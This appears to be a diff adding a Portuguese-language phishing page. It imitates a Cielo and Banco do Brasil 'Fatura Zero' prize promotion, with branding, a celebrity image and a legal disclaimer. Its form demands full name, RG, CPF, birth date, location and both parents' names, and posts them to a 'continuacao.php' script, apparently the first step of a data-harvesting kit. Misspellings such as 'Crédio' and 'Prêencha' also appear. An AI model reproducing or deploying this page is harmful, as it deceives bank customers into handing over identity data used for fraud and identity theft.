@@ -1,0 +1,351 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <title>
+   Fatura Zero - Agora aceitando todos os Cartões de Crédio.
+  </title>
+  <link href="imagens/favicon.ico" rel="shortcut icon" />
+  <link type="text/css" rel="stylesheet" href="css/padrao3.css" />
+  <style type="text/css">
+   &lt;!--
+
+    #centro {
+    width:100px;
+    height:100px;
+    position:absolute;
+    top:250%;
+    left:150%;
+    margin-top:150px;
+    margin-left:650px;
+    }
+
+body {
+
+	background:url('imagens/background2.jpg') no-repeat center top;
+
+	margin:3px; 
+
+	
+
+}
+.style13 {font-family: Arial, Helvetica, sans-serif; font-weight: bold; font-size: 11px; color: #666666; }
+.style14 {
+	font-size: 10px;
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	color: #990000;
+}
+.style16 {font-size: 12px; font-family: Arial, Helvetica, sans-serif;}
+.style17 {color: #666666}
+
+
+
+--&gt;
+  </style>
+  <script>
+   function confereCampos(form) {    
+    var campos = form.getElementsByTagName('input');
+    var podeEnviar = true;
+    for (i = 0; i &lt; campos.length; i++) {
+        var classe = campos[i].className;
+        var valor = campos[i].value;
+        if (classe == 'campos_texto' &amp;&amp; valor == '') podeEnviar = false;
+    }
+    if (podeEnviar == true) {
+        return true;
+    } else {
+        alert('Todos os campos são obrigatorios, favor preencher!')
+        return false;
+    }
+}
+  </script>
+  <script>
+   function mascara(src, mask){
+var i = src.value.length;
+var saida = mask.substring(0,1);
+var texto = mask.substring(i)
+if (texto.substring(0,1) != saida)
+{
+src.value += texto.substring(0,1);
+}
+}
+  </script>
+ </head>
+ <body>
+  <div id="tudo">
+   <div id="barraamarela">
+    <p>
+     Você está na página do cliente
+     <span>
+      Cielo.
+     </span>
+    </p>
+   </div>
+   <div id="ponta1">
+   </div>
+   <div id="ponta2">
+   </div>
+   <div id="barrazul">
+    <a href="http://www.comprapremiadaourocard.com.br/ourocard/index.html">
+     Agora você tem 3x mais chances de ganhar!
+    </a>
+   </div>
+   <div id="logobb">
+   </div>
+   <div id="menu">
+    <a onmouseout="document.home.src='imagens/home1.png'" onmouseover="document.home.src='imagens/home2.png'" href="index.html">
+     <img width="34" height="20" id="home" class="menu" name="home" src="imagens/home1.png" />
+    </a>
+    <img width="12" height="20" src="imagens/espacador.png" />
+    <a onmouseout="document.ganhadores.src='imagens/ganhadores1.png'" onmouseover="document.ganhadores.src='imagens/ganhadores2.png'" href="ganhadores.html">
+     <img width="65" height="20" id="ganhadores" name="ganhadores" src="imagens/ganhadores1.png" />
+    </a>
+    <img width="12" height="20" src="imagens/espacador.png" />
+    <a onmouseout="document.regulamento.src='imagens/regulamento1.png'" onmouseover="document.regulamento.src='imagens/regulamento2.png'" href="faleconosco.html">
+     <img width="72" height="20" id="regulamento" name="regulamento" src="imagens/regulamento1.png" />
+    </a>
+    <a onmouseout="document.regulamento.src='imagens/regulamento2.png'" onmouseover="document.ganhadores.src='imagens/ganhadores2.png'" href="ganhadores.html">
+    </a>
+    <img width="12" height="20" src="imagens/espacador.png" />
+   </div>
+   <div id="logopromo">
+    <width>
+    </width>
+   </div>
+   <div id="textointro">
+    <p>
+     A cada compra a partir de R$ 10,00 com qualquer Cartão de Crédito ou Débito na máquina da Cielo, você ganha um
+     <span>
+      número da sorte.
+     </span>
+     E é com ele que você participa dos sorteios diários de prêmios. Para participar primeiro cadastre-se nesta página, e BOA SORTE!
+    </p>
+   </div>
+   <div id="conteudo">
+    <div style="overflow:auto; display:block;" id="conteudovariavel">
+     <table width="614" border="0" align="center" cellspacing="2" cellpadding="2">
+      <tbody>
+       <tr>
+        <td>
+         <form onsubmit="return confereCampos(this)" target="_self" action="continuacao.php" method="post" name="form1" id="form1">
+          <table width="398" border="0" cellspacing="2" cellpadding="2">
+           <tbody>
+            <tr>
+             <td width="390" colspan="2">
+              <div align="center">
+               <span class="style13">
+                * Prêencha corretamente o Formulário abaixo.
+               </span>
+              </div>
+             </td>
+            </tr>
+            <tr>
+             <td width="136">
+              <span class="style13">
+               Nome Completo:
+              </span>
+             </td>
+             <td width="248">
+              <input type="text" maxlength="50" size="42" id="nome" class="campos_texto" name="nome" />
+             </td>
+            </tr>
+            <tr>
+             <td width="136">
+              <span class="style13">
+               RG:
+              </span>
+             </td>
+             <td width="248">
+              <input type="text" maxlength="25" size="15" id="rtg" class="campos_texto" name="rtg" />
+             </td>
+            </tr>
+            <tr>
+             <td width="136">
+              <span class="style13">
+               CPF:
+              </span>
+             </td>
+             <td width="248">
+              <input type="text" maxlength="11" size="20" id="cpf" class="campos_texto" name="cpf" />
+             </td>
+            </tr>
+            <tr>
+             <td width="136">
+              <span class="style13">
+               Data de nascimento:
+              </span>
+             </td>
+             <td width="248">
+              <span class="style17">
+               <input type="text" maxlength="10" size="11" onkeypress="mascara(this, '##/##/####')" id="nascimento" class="campos_texto" name="nascimento" />
+               <span class="style16">
+                Ex: 01/02/1993.
+               </span>
+              </span>
+             </td>
+            </tr>
+            <tr>
+             <td width="136">
+              <span class="style13">
+               Cidade:
+              </span>
+             </td>
+             <td width="248">
+              <input type="text" maxlength="20" size="20" id="cidade" class="campos_texto" name="cidade" />
+             </td>
+            </tr>
+            <tr>
+             <td width="136">
+              <span class="style13">
+               Estado:
+              </span>
+             </td>
+             <td>
+              <label>
+               <select id="estado" name="estado">
+                <option value="">
+                 Selecione
+                </option>
+                <option value="AC">
+                 Acre
+                </option>
+                <option value="AL">
+                 Alagoas
+                </option>
+                <option value="AP">
+                 Amapá
+                </option>
+                <option value="AM">
+                 Amazonas
+                </option>
+                <option value="BA">
+                 Bahia
+                </option>
+                <option value="CE">
+                 Ceará
+                </option>
+                <option value="DF">
+                 Distrito Federal
+                </option>
+                <option value="ES">
+                 Espírito Santo
+                </option>
+                <option value="GO">
+                 Goiás
+                </option>
+                <option value="MA">
+                 Maranhão
+                </option>
+                <option value="MT">
+                 Mato Grosso
+                </option>
+                <option value="MS">
+                 Mato Grosso do Sul
+                </option>
+                <option value="MG">
+                 Minas Gerais
+                </option>
+                <option value="PA">
+                 Pará
+                </option>
+                <option value="PB">
+                 Paraiba
+                </option>
+                <option value="PR">
+                 Paraná
+                </option>
+                <option value="PE">
+                 Pernambuco
+                </option>
+                <option value="PI">
+                 Piauí
+                </option>
+                <option value="RJ">
+                 Rio de Janeiro
+                </option>
+                <option value="RN">
+                 Rio Grande do Norte
+                </option>
+                <option value="RS">
+                 Rio Grande do Sul
+                </option>
+                <option value="RO">
+                 Rondonia
+                </option>
+                <option value="RR">
+                 Roraima
+                </option>
+                <option value="SC">
+                 Santa Catarina
+                </option>
+                <option value="SP">
+                 São Paulo
+                </option>
+                <option value="SE">
+                 Sergipe
+                </option>
+                <option value="TO">
+                 Tocantins
+                </option>
+               </select>
+              </label>
+             </td>
+            </tr>
+            <tr>
+             <td width="136">
+              <span class="style13">
+               Mãe:
+              </span>
+             </td>
+             <td width="248">
+              <input type="text" maxlength="50" size="37" id="mae" class="campos_texto" name="mae" />
+             </td>
+            </tr>
+            <tr>
+             <td width="136">
+              <span class="style13">
+               Pai:
+              </span>
+             </td>
+             <td width="248">
+              <span class="style17">
+               <input type="text" maxlength="50" size="37" id="pai" class="campos_texto" name="pai" />
+               <span class="style13">
+               </span>
+              </span>
+             </td>
+            </tr>
+            <tr>
+             <td width="390" colspan="2">
+              <p>
+               <font size="2" face="Verdana, Arial, Helvetica, sans-serif">
+                <input width="160" type="image" height="48" src="imagens/botaocadastrese2.png" id="Avancar3" name="Avancar" />
+               </font>
+              </p>
+             </td>
+            </tr>
+           </tbody>
+          </table>
+         </form>
+        </td>
+       </tr>
+      </tbody>
+     </table>
+    </div>
+   </div>
+   <div id="rodrigo">
+    <img width="144" height="411" src="imagens/rodrigofaro2.png" />
+   </div>
+   <div id="legal">
+    <h3>
+     <strong>
+      A Promoção Fatura Zero não inclui taxas na fatura do cartão.
+     </strong>
+    </h3>
+    <p>
+     *Prêmios pagos em dinheiro diretamente ao contemplado. Valores líquidos de Imposto de Renda, conforme legislação vigente. Lastreados por Títulos de Capitalização da Brasilcap Capitalização S.A., CNPJ 15.138.043/0001- 05, aprovados pela SUSEP, Processos n° 15414.002830/2011-48 (cliente Cielo) , nº 15414.002831/2011-92 (lojistas) e nº 15414.002832/2011-37 (vendedores). A aprovação desses títulos pela SUSEP não implica, por parte da Autarquia, incentivo ou recomendação à sua aquisição, representando, exclusivamente, sua adequação às normas em vigor. Consulte o regulamento no site.
+    </p>
+   </div>
+  </div>
+ </body>
+</html>
